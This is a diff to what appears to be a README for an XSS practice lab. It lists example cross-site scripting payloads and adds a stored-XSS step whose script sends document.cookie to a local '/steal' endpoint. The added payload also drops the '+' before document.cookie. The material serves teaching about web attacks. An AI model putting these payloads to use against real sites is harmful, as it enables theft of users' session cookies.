@@ -81,6 +81,7 @@ Other commands you could try:
 | 3 | `<img src="https://i.pinimg.com/736x/0f/5d/6a/0f5d6a89dc7d8c73d025c331ef0c6a4f.jpg" onerror=alert('XSS') style="width:200px; height:auto; display:block; border:1px solid #ddd;">` | Display photo |
 | 4 | `<a href="javascript:alert('XSS')">Click Me</a>` | Click me alert button |
 | 5 | `<script>alert(document.cookie)</script>` | Cookie info displaying |
+| 6 | 1.Download python script from this repo.<br>2.`python3 app.py`<br> 3.`<script>new Image().src='http://127.0.0.1:8000/steal?cookie=' document.cookie;</script>`<br> 4. Click on the `XSS (Stored)` tab as a user| Send coookie to (local) server |
 
 </div>
 
